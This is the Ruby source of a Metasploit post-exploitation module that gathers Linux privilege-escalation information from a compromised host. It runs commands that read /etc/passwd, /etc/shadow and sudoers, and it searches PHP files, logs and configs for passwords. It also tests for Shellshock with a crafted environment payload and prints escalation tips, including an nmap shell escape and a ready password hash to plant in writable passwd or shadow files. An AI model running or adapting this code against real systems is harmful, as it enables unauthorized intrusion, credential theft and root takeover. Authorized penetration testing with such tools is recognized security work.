##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Privilege Escalation Information Gathering',
      'Description'   => %q{
        This module gathers a multitude of information for Linux privilege
        escalation without writing to the target. Based on linuxprivchecker.py
        by Mike Czumak and "Basic Linux Privilege Escalation" by g0tmi1l.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'sn0wfa11 <jhale85446[at]gmail.com>'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => 
        [
          [ 'URL', 'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' ],
          [ 'URL', 'http://www.securitysift.com/download/linuxprivchecker.py' ]
        ]
    ))

    register_options(
      [
        OptInt.new('TIMEOUT', [ true, "Timeout on the execute command. (In seconds)", 300]),
        OptString.new('PASSWORD', [ false, "Password of current user, for 'sudo su' check"])
      ], self.class)
  end

  def run
    final_output = ""
    @@quick_fails_ouput = ""

    @@distro = execute("cat /etc/issue")
    @@kernel_full = execute("cat /proc/version")
    @@user = execute("whoami")
    @@hostname = execute("hostname")
    @@release = execute("cat /etc/*-release")

    #kernel_number = kernel_full.split(" ")[2].split("-")[0] if kernel_full
    #kernel_split = kernel_full.split(" ")[2].split("-")[0].split(".") if kernel_full
    #kernel_suffix = kernel_full.split(" ")[2].split("-")[1] if kernel_full

    # Print the info
    print_good("Info:")
    print_good("\t#{@@distro}")
    print_good("\t#{@@kernel_full}")
    print_good("\tModule running as \"#{@@user}\" user against #{@@hostname}")

    final_output << bigline
    final_output << "LINUX PRIVILEGE ESCALATION CHECKS by sn0wfa11"
    final_output << bigline

    print_status("1 / 9 - Getting Basic Info")
    basic_info_output = basic_info

    print_status("2 / 9 - Looking for Initial Quick Fails")
    @@quick_fails_ouput << quick_fails

    print_status("3 / 9 - Getting App and Tool Info")
    tools_info_output = tools_info

    print_status("4 / 9 - Getting Network Info")
    network_info_output = network_info

    print_status("5 / 9 - Getting Basic File System Info")
    filesystem_info_output = filesystem_info

    print_status("6 / 9 - Getting User and Environmental Info")
    userenv_info_output = userenv_info

    print_status("7 / 9 - Getting File and Directory Permissions")
    file_dir_perms_output = file_dir_perms

    print_status("8 / 9 - Getting Processes and Application Information")
    proc_aps_info_output = proc_aps_info(@@release)

    print_status("9 / 9 - Getting Extra Information and Performing Deep File Search")
    extra_info_output = extra_info

    # Build final output
    final_output << basic_info_output
    final_output << smline
    final_output << @@quick_fails_ouput
    final_output << smline
    final_output << tools_info_output
    final_output << smline
    final_output << network_info_output
    final_output << smline
    final_output << filesystem_info_output
    final_output << smline
    final_output << userenv_info_output
    final_output << smline
    final_output << file_dir_perms_output
    final_output << smline
    final_output << extra_info_output
    final_output << bigline
    save(final_output)
  end

  ###########################################
  # Managment Functions
  ###########################################

  def bigline
    "\n=================================================================================================\n"
  end

  def smline
    "\n-------------------------------------------------------------------------------------------------\n"
  end

  def save(data, ctype = 'text/plain')
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, "priv_check.txt", "LINUX PRIV CHECK")
    print_good("LINUX PRIV CHECK stored in #{loot}")
  end

  def execute(cmd, time_out = datastore['TIMEOUT'])
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd, nil, time_out)
    vprint_line("#{output}")
    return output
  end

  def get(msg, cmd)
    output = "\n"
    output << "[+] #{msg}\n"
    result = execute(cmd)
    result.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    output << "\n"
    return output
  end

  def prnt(msg, input)
    output = "\n"
    output << "[+] #{msg}\n"
    output << format(input)
    return output
  end

  def format(input)
    output = ""
    input.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    output << "\n"
    return output
  end

  ###########################################
  # Enumeration Functions
  ###########################################

  def basic_info
    output = "\n[*] BASIC SYSTEM INFO:\n"
    output << prnt("Kernel", @@kernel_full)
    output << prnt("Hostname", @@hostname)
    output << prnt("Operating System", @@distro)
    output << prnt("Full Release Info", @@release)
    output << cpu_info
    output << prnt("Current User", @@user)
    output << get("Current User ID", "id")
    output << sudo_rights
    output << get("UDEV - Check for PE if < 141 and Kernel 2.6.x!", "udevadm --version 2>/dev/null")
    return output
  end

  def quick_fails
    output = "\n[*] QUICK FAIL$:\n"
    output << shellshock
    output << mysql_nopass
    output << mysql_as_root
    output << sudo_group
    output << sudo_su_check
    output << world_writable_passwd
    output << world_writable_shadow
    output << readable_shadow
    return output
  end

  def tools_info
    output = "\n[*] INSTALLED LANGUAGES/TOOLS:\n"
    output << execute("which awk perl python ruby gcc g++ vi vim nano nmap find netcat nc ncat wget tftp ftp 2>/dev/null")
    return output
  end

  def network_info
    output = "\n[*] NETWORKING INFO:\n"
    output << get("Interfaces", "/sbin/ifconfig -a")
    output << get("Netstat", "netstat -antup | grep -v 'TIME_WAIT' | grep -v 'CLOSE_WAIT'")
    output << get("Route", "/sbin/route")
    output << get("Iptables", "iptables -L 2>/dev/null")
    return output
  end

  def filesystem_info
    output = "\n[*] FILESYSTEM INFO:\n"
    output << get("Mount results", "mount")
    output << get("fstab entries", "cat /etc/fstab 2>/dev/null")
    output << get("Scheduled cron jobs", "ls -la /etc/cron* 2>/dev/null")
    output << get("Crontab for current user", "crontab -l")
    output << get("Writable cron dirs", "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null")
    return output
  end

  def userenv_info
    output = "\n[*] USER AND ENVIRONMENTAL INFO:\n"
    output << get("Logged in User Activity", "w 2>/dev/null")
    output << get("Super Users Found:", "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'")
    output << get("Environment", "env 2>/dev/null | grep -v 'LS_COLORS'")
    output << get("Root and Current User History (depends on privs)", "ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null")
    output << get("Sudoers (privileged)", "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null")
    output << get("All Users", "cat /etc/passwd")
    output << get("User With Potential Login Rights", "cat /etc/passwd | grep '/bin/bash'")
    output << get("Group List", "cat /etc/group")
    return output
  end

  def file_dir_perms
    output = "\n[*] FILE AND DIRECTORY PERMISSIONS/CONTENTS:\n"
    output << get("Protected Files", "ls -al /etc/passwd; ls -al /etc/shadow; ls -al /etc/group")
    output << get("Logfile Permissions", "ls -al /var/log/syslog 2>/dev/null; ls -al /var/log/auth.log 2>/dev/null")
    output << get("World Writeable Directories for User/Group 'Root'", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep root")
    output << get("World Writeable Directories for Users other than Root", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root")
    output << get("World Writable Files", "find / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2>/dev/null")
    output << get("Checking if root's home folder is accessible", "ls -ahlR /root 2>/dev/null")
    output << suid_files
    output << get("SGID Files and Directories", "find / \\( -perm -2000 \\) -exec ls -ld {} \\; 2>/dev/null")
    return output
  end

  def proc_aps_info(release)
    output = "\n[*] PROCESSES AND APPLICATIONS:\n"
    output << get_services(release)
    output << get("Current processes", "ps aux | awk '{print $1,$2,$9,$10,$11}'")
    output << get("Apache Version and Modules", "apache2 -v 2>/dev/null; apache2ctl -M 2>/dev/null; httpd -v 2>/dev/null; apachectl -l 2>/dev/null")
    output << get_packages(release)
    return output
  end

  def extra_info
    output = "\n[*] Extra Information and Deep File Search:\n"
    output << get("Listing other home folders", "ls -ahlR /home 2>/dev/null")
    output << files_owned_users
    output << get("PHP Files Containing Keyword: 'password'", "find / -name '*.php' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get("Logs Containing Keyword: 'password'", "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get("Config Files Containing Keyword: 'password'", "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get("Apache Config File", "cat /etc/apache2/apache2.conf 2>/dev/null")
    return output
  end

  ##########################################
  # User Enumeration Functions
  ##########################################
  def files_owned(user)
    return get("Files Owned by #{user}", "find / -user #{user} -type f -size +0M -ls 2>/dev/null")
  end

  def files_owned_users
    output = "\n[*] Files containing data owned by users other than root\n"
    initial_list = execute("cat /etc/passwd | grep '/bin/bash'")
      initial_list.lines.each do |line|
        user = line.split(':')[0]
        output << files_owned(user) unless user == "root"
      end
    return output
  end

  ###########################################
  # Specific Distro Functions
  ###########################################

  def get_services(release)
    output = "\n[+] Current Services\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("/sbin/chkconfig --list 2>/dev/null")
    when /slackware/
      output << "\nEnabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'*$\' 2>/dev/null")
      output << "\n\nDisabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'[a-z0-9A-z]$\' 2>/dev/null")
    when /ubuntu|debian/
      output << execute("service --status-all 2>/dev/null")
    when /gentoo/
      output << execute("/bin/rc-status --all 2>/dev/null")
    when /arch/
      output << execute("/bin/egrep '^DAEMONS' /etc/rc.conf 2>/dev/null")
    else
      output << "Could not determine the Linux Distribution to get list of configured services\n"
    end
    output << "\n"
    return output
  end

  def get_packages(release)
    output = "\n[+] Installed Packages\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("rpm -qa | sort -u")
    when /slackware/
      output << execute("ls /var/log/packages")
    when /ubuntu|debian/
      output << execute("dpkg -l | awk '{$1=$4=\"\"; print $0}'")
    when /gentoo/
      output << execute("equery list")
    when /arch/
      output << execute("/usr/bin/pacman -Q")
    else
      output << "Could not determine package manager to get list of installed packages\n"
    end
    output << "\n"
    return output
  end

  ###########################################
  # Specific Checks
  ###########################################

  def cpu_info
    output = ""
    result = cmd_exec("cat /proc/cpuinfo").to_s
    cpu_info = result.split("\n\n")[0]
    cpu_info.split("\n").each do |line|
      output << "Speed: " + line.split(': ')[1] + "\n" if line =~ /cpu MHz/
      output << "Product: " + line.split(': ')[1]  + "\n" if line =~ /model name/
      output << "Vendor: " + line.split(': ')[1] + "\n" if line =~ /vendor_id/
      output << "Bits: " + line.split(': ')[1] + "\n" if line =~ /cache_alignment/
    end
    output << "Cores: " + result.split("\n\n").size.to_s
    return prnt("Processor Information", output)
  end

  def suid_files
    output = ""
    files = execute("find / \\( -perm -4000 \\) -exec ls -al --full-time {} \\; 2>/dev/null | sort -k6 | cut -d \" \" --complement -f 7,8").split("\n")
    files.each do |file|
      if file.downcase =~ /nmap/
        print_good("QUICKFAIL!: nmap has suid bit set!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: nmap has suid bit set! Do: 'nmap --interactive' then 'nmap> !sh'\n"
        @@quick_fails_ouput << format(file)
      elsif file.downcase =~ /vim/
        print_good("QUICKFAIL!: vim has suid bit set!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: vim has suid bit set! You can edit protected files with this!\n"
        @@quick_fails_ouput << format(file)
      elsif file.downcase =~ /nano/
        print_good("QUICKFAIL!: nano has suid bit set!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: nano has suid bit set! You can edit protected files with this!\n"
        @@quick_fails_ouput << format(file)
      elsif file.downcase =~ /perl/
        print_good("QUICKFAIL!: perl has suid bit set!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: perl has suid bit set!\n"
        @@quick_fails_ouput << format(file)
      elsif file.downcase =~ /python/
        print_good("QUICKFAIL!: python has suid bit set!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: python has suid bit set!\n"
        @@quick_fails_ouput << format(file)
      elsif file.downcase =~ /ruby/
        print_good("QUICKFAIL!: ruby has suid bit set!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: ruby has suid bit set!\n"
        @@quick_fails_ouput << format(file)
      end
      output << "#{file}\n"
    end
    return prnt("SUID Files", output)
  end

  def sudo_rights
    output = ""
    result = execute("sudo -l", 15)
    if result.downcase =~ /may run/
      print_good("QUICKFAIL!: User #{@@user} has sudo rights!")
      @@quick_fails_ouput << "\n[+] QUICKFAIL!: User #{@@user} has sudo rights!\n"
      @@quick_fails_ouput << format(result)
    end
    return prnt("SUDO rights check", result)
  end


  ###########################################
  # Quck-Fail Checks
  ###########################################

  def shellshock
    output = ""
    result = execute("env X='() { :; }; echo \"CVE-2014-6271 vulnerable\"' bash -c date\n")
    if result =~ /vulnerable/
      print_good("QUICKFAIL!: Shellshock Vulnerable! Look for web app or process running as root to exploit!")
      output << "\n[+] QUICKFAIL!: Shellshock Vulnerable! Look for web app process running as root to exploit!\n"
      return output
    end
    return ""
  end

  def mysql_nopass
    output = ""
    result = execute("mysql -uroot -e 'show databases;' 2>/dev/null")
    if result.downcase =~ /database/
      print_good("QUICKFAIL!: mysql does not require a password for root user!")
      output << "\n[+] QUICKFAIL!: mysql does not require a password for root user!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def mysql_as_root
    output = ""
    result = execute("ps aux | grep mysql | grep root | grep -v grep")
    if result.downcase =~ /mysql/ and !result.downcase =~ /mysqld_safe/
      print_good("QUICKFAIL!: mysql is running as root!")
      output << "\n[+] QUICKFAIL!: mysql is running as root!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def sudo_group
    user = execute("whoami").downcase
    output = ""
    result = execute("cat /etc/group | grep sudo")
    if result.downcase =~ /#{user}/
      print_good("QUICKFAIL!: " + user + " is in sudoers group! You gotta password?")
      output << "\n[+] QUICKFAIL!: " + user + " is in sudoers group! You gotta password?\n"
      output << format(result)
    end
    return output
  end

  def sudo_su_check
    return "" unless datastore['PASSWORD']
    output = ""
    password = datastore['PASSWORD']
    result = execute("echo #{password} | sudo -S su -c id")
    if result.downcase =~ /root/
      print_good("QUICKFAIL!: User #{@@user} has sudo su rights! And... You're DONE!")
      ouput << "\n[+] QUICKFAIL!: User #{@@user} has sudo su rights! And... You're DONE!\n"
      output << format(result)
    end
    return output
  end

  def world_writable_passwd
    output = ""
    result = execute("ls -al /etc/passwd | awk '$1 ~ /^........w./' 2>/dev/null")
    if result.downcase =~ /passwd/
      print_good("QUICKFAIL!: /etc/passwd is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/passwd is world writable!\n"
      output << format(result)
      output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "\tPassword: 12345\n"
      output << "\t\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def world_writable_shadow
    output = ""
    result = execute("ls -al /etc/shadow | awk '$1 ~ /^........w./' 2>/dev/null")
    if result.downcase =~ /shadow/
      print_good("QUICKFAIL!: /etc/shadow is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/shadow is world writable!\n"
      output << format(result)
      output << "\nNOTE: YOU NEED TO REBOOT TO RELOAD /etc/shadow!!! Is /etc/password writeable?\n"
      output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "\tPassword: 12345\n"
      output << "\t\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def readable_shadow
    output = ""
    result = execute("cat /etc/shadow 2>/dev/null")
    if result != ""
      print_good("QUICKFAIL!: /etc/shadow is readable!")
      output << "\n[+] QUICKFAIL!: /etc/shadow is readable!\n"
      output << format(result)
      return output
    end
    return ""
  end
end
